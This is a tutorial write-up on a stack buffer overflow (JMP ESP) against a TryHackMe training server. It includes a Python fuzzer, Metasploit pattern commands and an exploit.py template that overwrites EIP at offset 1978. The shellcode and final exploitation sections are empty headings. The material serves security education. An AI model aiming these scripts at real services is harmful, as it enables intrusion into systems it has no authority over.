![Bit wave](/images/wave.png)

# Stack Buffer Overflow: JMP ESP Attack

The following article will explain in a clear -- hopefully -- way how to exploit the stack based buffer overflow for a vulnerable Windows 32bit executable.
This executable seems to have **ASLR (Address Space Layout Randomization) activated** -- since everytime it is run, the stack frame is located in a different address -- and **no DEP (Data Execution Prevention)** since we're able to execute istructions placed within the stack frame.

The vulnerable example executable is the one provided by TryHackMe, within the room [“bufferoverflowprep”](https://tryhackme.com/room/bufferoverflowprep)

Theoretical pre-requisites to understand this article:
- basic knowledge of how memory works (e.g. stack, heap, bss, text segments)
- basic knowledge of assembly
- networking basics

Other pre-requisites (not needed if you want to experiment via the TryHackMe room):
- Windows host
- [Immunity Debugger](https://www.immunityinc.com/products/debugger/) 
- [Mona script](https://github.com/corelan/mona/tree/master)
- A vulnerable executable, compiled with no DEP and with DLLs (not ASLRed) containing some JMP ESP statements.

## What is a buffer overflow attack in simple words.

Buffer overflows happens because of programming errors that allow the attacker to insert within a buffer more data that it can hold.
Normally this would result in the well known *segmentation fault* error... but what if we could inject malicious code to make the program do things it was not supposed to do? buffer overflows aim to this.

## A closer look: why does this happen?

This happens because of the design of the memory.

![Stack frame](/images/simple_buffer.png)

When a function is called, a structure called a *stack frame* is pushed onto the stack, and the EIP register jumps to the first instruction of the function. 
Each stack frame contains the local variables for that function and a return address so EIP can be restored: when the function is done, the stack frame is popped off the stack and the return address is used to restore EIP.

A stack frame contains the following items, that will be pushed upon the stack in the following order.

1. Function parameters.
2. **Return address**: it is the address of the istruction after the one that performed the call to this function. It is pushed upon the stack when the processor encounters the `call` statement and it will be popped out of the stack when current function will end in order to allow the correct execution of the main program. 
3. Saved Frame Pointer (SFP): the EBP register—sometimes called the frame pointer (FP) or local base (LB) pointer—is used to reference local function variables in the current stack frame. The SFP is the EBP from the previous subfunction, that will be restored when current subfunction ends[^1].
4. Local function parameters: it will include the vulnerable buffer to overflow.

When the vulnerable buffer is written with more bytes that it can handle, these bytes will overwrite the contiguous memory and, if the size of the input is big enough, they will overwrite the return address: if the content of the input overwriting the return address is just junk data , it will lead to a program crash, instead, **if it is an address that the attacker can control, it will lead the program to perform actions that it was not designed to perform (as popping out a shell!).** 


## How to do it practically

Practically speaking, we can follow a set of steps, from discovering if the executable is vulnerable to crafting the malicious shellcode to exploit it.
These steps are the following:

1. **Fuzzing**: we will try to crash the program with an increasing input to discover if it is vulnerable to BoF.
2. **Finding the return address**: this phase will allow us **to find out how many bytes there are between the buffer and the return pointer**, that is the address that we need to overwrite with the address pointing to the malicious code.
3. **Badchars** discovery: here we need to discover which characters would not be written correctly within the memory, so we must take note of these in order to write a shellcode that does not contain them.
4. Generating **shellcode**.
5. **Pointing to the shellcode**.
6. **Exploitation: fun and profit ;-)**

### Fuzzing

Fuzzing means to provide unexpected input data to the target executable in order to trigger *unexpected behaviour*.

The vulnerable executable we're targeting in this experiment is a server: we can connect to it with netcat by typing

```bash
nc ip_address port
```

The output we're getting is the following

![netcat connection](images/nc_connection.png)

This phase objective is to crash the vulnerable target by inserting large input values: we can automate this task via a simple python script that will send increasingly long strings comprised of As.

```python3
#!/usr/bin/env python3

import socket, time, sys

# Supposing that the target server ip address is 10.10.116.35
ip = "10.10.116.35"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)

```

After executing the script, we figure out that the server crashes with an input value of 2000 bytes (2000 As).

![Crashing the server with fuzzer.py](images/fuzzer_py-crashing_the_server.png)

**Let's rock, the server is vulnerable!** 

Now all we need to do is to *take the measures* in order inject a payload that overwrites the return address with one that we can control.

# Finding the return address (aka taking the measures)

![Mary poppins taking the measures](images/taking_measures-buffoverflow_article-msfvenom.gif)

The most simple way to find out the distance between the buffer and the return address, called the *offset*, is to input a string called a *cyclic sequence*: it is a string in which every possible length-n string occurs exactly once as a substring. (e.g. [De Bruijn sequence](https://en.wikipedia.org/wiki/De_Bruijn_sequence)). The reason behind that choice is simple: <ins>since our input value will overwrite the return address within the stack and that value will be popped out within the EIP register when the program crashes, we just need to find the value of EIP within the cyclic sequence we injected to figure out the offset.<ins>

Using the cyclic sequence guarantees that <ins>the string found within EIP is unique<ins>, so the offset will be correct.

The cyclic pattern shall be longer that the input value that crashed the target in order to be sure to overwrite the return address: at a guess, 400 bytes longer should suffice, but only the debugger can reveal it.

Let's generate a cyclic pattern via the *metasploit framework*:

```bash
# Generating a 2400 byte cyclic pattern.
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
```
the resulting pattern will be the following.

![image](https://github.com/marcourbano/Stack-Buffer-Overflow-Guide/assets/22402683/69b40507-ed62-4c0f-b6d9-fb916ef1f8ee)

In order to send this payload to the vulnerable server, we can write another simple python script that can be used to exploit it.

```python3
import socket

ip = "10.10.116.35"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
# Little Endian --> because it has to be pushed within the stack and will be popped out from the least significant byte.
retn = ""
# NOP Sled 
padding = ""
# Cyclic pattern / Bytearray (badchars: \x00) / Shellcode
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
The main parts composing the string to inject are:

- prefix: this case will be the name of the program to invoke.
- **offset**: this is the effective distance between buffer start and return address within the stack.
- **overflow**: the series of characters that will overflow the buffer.
- **retn**: the value we want to write within the EIP, that is the value that will overwrite the return address within the stack frame.
- **padding**: it is used to <ins>make room between the effective malicious code and the return address. The reason of adding a padding, that is composed by a set of NOP (No OPeration statement), is that the payload we're gonna try to execute could not be placed exactly near the return address because of memory allocation. Using a NOP Sled will allow us to execute our exploit more reliably.<ins>
- **payload**: the effective malicious code to be executed by the processor. It is made by hexadecimal values that represent assembly code. 

Executing this script with the cyclic pattern as payload will crash the server and overwrite the return address with a 4 byte substring from that.

![Immunity debugger, cyclic pattern](images/immunity_debugger-cyclic_pattern.png)

Analyzing the EIP registry value with Immunity Debugger, we find out that it equals to `6F43396E`.
This is an hexadecimal value from the cyclic pattern; we can convert it to char, but first we need to rewrite it in inverse order, since the values will be written to the stack in *little-endian* (the least significant byte comes first): the hexadecimal value for these characters is `6E39436F`, that stands for `n9Co`.

![pattern_create, grep](images/pattern_create-cyclic_pattern-grep.png)

Since we're lazy, we can calculate the distance between these chars and the start of the cyclic pattern with another script from the metasploit framework, the `pattern_offset.rb` script.

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2400 -q 6F43396E
```

That will result in `1978`.


![calculating offset](images/pattern_offset_rb-calculating_offset.png)

The last thing we need to do in this phase is to check if the offset discovered is correct by modifying the `exploit.py` script to write **something we can retrieve within the return address**.

![exploit_ABBA](images/exploit_py-adding_offset_plus_ABBA.png)

We set “ABBA”, that is 4 bytes value, to fill the return address.

![Immunity debugger, ABBA](images/immunity_debugger-finding_ABBA.png)

Executing exploit.py and then analysing the EIP register, we can correctly find that the value of return address is `\x41\x42\x42\x41`, hence `ABBA`!

![ABBA](images/abba+%281%29-1768904860.gif)

### Badchars discovery.

### Generating shellcode.

### Pointing to the shellcode.

### Exploitation: fun and profit ;-)

[^1]: When the function ends, restoring the "functional context” of the previous function means to pop the SFP and to set it as the EBP value and to set EIP as the Return Address.
